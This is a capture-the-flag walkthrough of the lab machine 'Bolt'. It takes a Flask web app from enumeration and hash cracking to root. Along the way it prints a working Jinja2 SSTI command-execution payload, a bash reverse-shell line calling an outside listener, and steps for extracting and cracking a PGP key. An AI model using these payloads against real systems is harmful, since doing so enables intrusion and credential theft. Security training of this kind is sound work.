## Enumeration

`$ nmap -p- -A --open 10.10.11.114` 

```bash
Nmap scan report for 10.10.11.114
Host is up (0.23s latency). 
Not shown: 65532 closed ports 
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 
| ssh-hostkey:
|   3072 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e (RSA) 
|   256 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea (ECDSA) 
|_  256 a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 (ED25519) 
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 76362BB7970721417C5F484705E5045D 
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu) 
|_http-title:     Starter Website -  About 
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 82C6406C68D91356C9A729ED456EECF4 
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-title: Passbolt | Open source password manager for teams 
|_Requested resource was /auth/login?redirect=%2F
| ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty 
Ltd/stateOrProvinceName=Some-State/countryName=AU
| Issuer: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/ 
stateOrProvinceName=Some-State/countryName=AU
| Public Key type: rsa 
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption 
| Not valid before: 2021-02-24T19:11:23
| Not valid after:  2022-02-24T19:11:23
| MD5:   3ac3 4f7c ee22 88de 7967 fe85 8c42 afc6
|_SHA-1: c606 ca92 404f 2f04 6231 68be c4c4 644f e9ed f132 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The ssl certificate reveals the domain name so go ahead and add it to local hosts.
`$ echo "10.10.11.114 passbolt.bolt.htb bolt.htb" | sudo tee -a /etc/hosts`

## HTTP(S)

On http we have a Starter Website page and on https an open source password manager Passbolt.

On http there's a login and register page. When you register a new user however it will respond with a server error. On the "Pages" drop down menu the Download option gives us a docker tar file. Extrack the tar file.

```bash
tar -xvf image.tar
```

The file contains a lot of layers/directories. We can use a tool like `Dive` to view all files at a nice structured way. 

From poking around we discover a db.sqlite3 in one of the layers. We can extract data from this db.

```bash
sqlite3 a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer/db.sqlite3

sqlite> .table
User
sqlite> select * from user;
1|admin|admin@bolt.htb|$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.||
```

We can use hashcat to crack the password which will give us the credentials we need to login on the web application on port 80.

`admin:deadbolt`

On the web app on the direct chat function we get a hint to look for virtuals hosts.


```bash
gobuster -q vhosts -u http://bolt.htb -w ~/SecLists/Discovery/DNS/subdomains- 
top1million-5000.txt -t 60
```

We discover `demo.bolt.htb` and `mail.bolt.htb`. Add them to the hosts.

Visiting both subdomains we have login forms but we can't use the same credentials. Also on the `demo` host there's a register panel but requires an invitation code to successfully register a new user.

Back on the docker image we search for an invite code.

Based on the size of each directory we gonna search on the largest one first
```bash
du -sh *
```

Indeed we find a code.

```bash
$ grep -iR 'code' 2>/dev/null        
# XNSS-HSJW-3NGU-8XTJ
```

Use the invite code to register a new user and then login into the application. With the same credentials we can login to the `mail` subdomain too.

On the `demo` vhost and in profile page we can modify the fields we have and try to enter malicious payloads. 

Because we know that the application's server is running Flask from the footer of dashboard page "AdminLTE Flask" we'll try SSTI (common attack vector in Flask applications)


Input a basic payload like `{{7*7}}` on every field on the profile page. After submitting the change it will send a confirmation email on the email app on the other vhost.

Reading the new email we have a SSTI confirmed as the payload is executed and displays 49.

We also know that it uses Jinja2 template and we can try SSTI payloads from PayloadsAllTheThings.

The one that worked is as follows.

```bash
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}

# Back on the email vhost
# uid=33(www-data) gid=33(www-data) groups=33(www-data) 
```

Now that we have code execution we can replace `id` command with reverse tcp shell.
```bash
# replace `id` command in the SSTI payload
/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.87/4444 0>&1"
```
Now we have a shell on the system.

## Lateral Movement

Tranfer linpeas to the system. Here are some interesting sections:

```bash
╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files 
  Group www-data:
/etc/passbolt 
/etc/passbolt/gpg
/etc/passbolt/gpg/serverkey.asc 
/etc/passbolt/gpg/serverkey_private.asc
```

Following the above lead we navigate to `/etc/passbolt` there's we find a password for mysql on `passbolt.php`


```bash
'username' => 'passbolt',
'password' => 'rT2;jW7<eY8!dX8}pQ8%'
``` 

```bash
mysql -u passbolt -p

# two interesting tables "users" and "secrets"
# in "users" we don't find anything but
# in "secrets" we find a pgp key

-----BEGIN PGP MESSAGE----- 
Version: OpenPGP.js v4.10.9 
Comment: https://openpgpjs.org
wcBMA/ZcqHmj13/kAQgAkS/2GvYLxglAIQpzFCydAPOj6QwdVV5BR17W5psc 
g/ajGlQbkE6wgmpoV7HuyABUjgrNYwZGN7ak2Pkb+/3LZgtpV/PJCAD030kY 
pCLSEEzPBiIGQ9VauHpATf8YZnwK1JwO/BQnpJUJV71YOon6PNV71T2zFr3H 
oAFbR/wPyF6Lpkwy56u3A2A6lbDb3sRl/SVIj6xtXn+fICeHjvYEm2IrE4Px 
l+DjN5Nf4aqxEheWzmJwcyYqTsZLMtw+rnBlLYOaGRaa8nWmcUlMrLYD218R 
zyL8zZw0AEo6aOToteDPchiIMqjuExsqjG71CO1ohIIlnlK602+x7/8b7nQp 
edLA7wF8tR9g8Tpy+ToQOozGKBy/auqOHO66vA1EKJkYSZzMXxnp45XA38+u 
l0/OwtBNuNHreOIH090dHXx69IsyrYXt9dAbFhvbWr6eP/MIgh5I0RkYwGCt 
oPeQehKMPkCzyQl6Ren4iKS+F+L207kwqZ+jP8uEn3nauCmm64pcvy/RZJp7 
FUlT7Sc0hmZRIRQJ2U9vK2V63Yre0hfAj0f8F50cRR+v+BMLFNJVQ6Ck3Nov 
8fG5otsEteRjkc58itOGQ38EsnH3sJ3WuDw8ifeR/+K72r39WiBEiE2WHVey 
5nOF6WEnUOz0j0CKoFzQgri9YyK6CZ3519x3amBTgITmKPfgRsMy2OWU/7tY 
NdLxO3vh2Eht7tqqpzJwW0CkniTLcfrzP++0cHgAKF2tkTQtLO6QOdpzIH5a 
Iebmi/MVUAw3a9J+qeVvjdtvb2fKCSgEYY4ny992ov5nTKSH9Hi1ny2vrBhs 
nO9/aqEQ+2tE60QFsa2dbAAn7QKk8VE2B05jBGSLa0H7xQxshwSQYnHaJCE6 
TQtOIti4o2sKEAFQnf7RDgpWeugbn/vphihSA984
=P38i
-----END PGP MESSAGE-----
```

But we need a private key to decrypt the message. Luckily password reuse is a think and we can switch to user 'eddie' with the same db password.


## Privilege Escalation

Coonect to eedie via ssh and on the banner screen we read that we email. On `/var/mail` read eddie's received mail.

```bash
cat /var/mail/eddie
From clark@bolt.htb  Thu Feb 25 14:20:19 2021 
Return-Path: <clark@bolt.htb>
X-Original-To: eddie@bolt.htb 
Delivered-To: eddie@bolt.htb
Received: by bolt.htb (Postfix, from userid 1001) 
        id DFF264CD; Thu, 25 Feb 2021 14:20:19 -0700 (MST) 
Subject: Important!
To: <eddie@bolt.htb>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20210225212019.DFF264CD@bolt.htb> 
Date: Thu, 25 Feb 2021 14:20:19 -0700 (MST) 
From: Clark Griswold <clark@bolt.htb>
Hey Eddie,
The password management server is up and running.  Go ahead and download the extension to 
your browser and get logged in.  Be sure to back up your private key because I CANNOT 
recover it.  Your private key is the only way to recover your account.
Once you're set up you can start importing your passwords.  Please be sure to keep good 
security in mind - there's a few things I read about in a security whitepaper that are a 
little concerning...
-Clark
```
Again using linpeas we find the private key.

```bash
══╣ Possible private SSH keys were found! 
/etc/ImageMagick-6/mime.xml
/home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/
3.0.5_0/index.min.js
/home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/
3.0.5_0/vendors/openpgp.js
/home/eddie/.config/google-chrome/Default/Local Extension Settings/ 
didegimhafipceonhjepacocaffmoppf/000003.log
```

Read the log file and extract eddie's pgp key. Remove the `/r/n` characters (you can do this in vim with `%s/\\\\r\\\\n/\r/g` and convert to a hash format.

```bash
gpg2john gpg.key > gpg.hash 
```

Take the hash and crack with john.
```bash
john gpg.hash --wordlist=/usr/share/wordlists/rockyou.txt
# merrychristmas   (Eddie Johnson)
```

Now import the key and then decrypt the message using the above passphrase

```bash
gpg --import gpg.key # on the prompt use the passphrase

gpg -d passbolt.key # on the prompt use the passphrase

# {"password":"Z(2rmxsNW(Z?3=p/9s","description":""}
```
Switch to root using the above password.

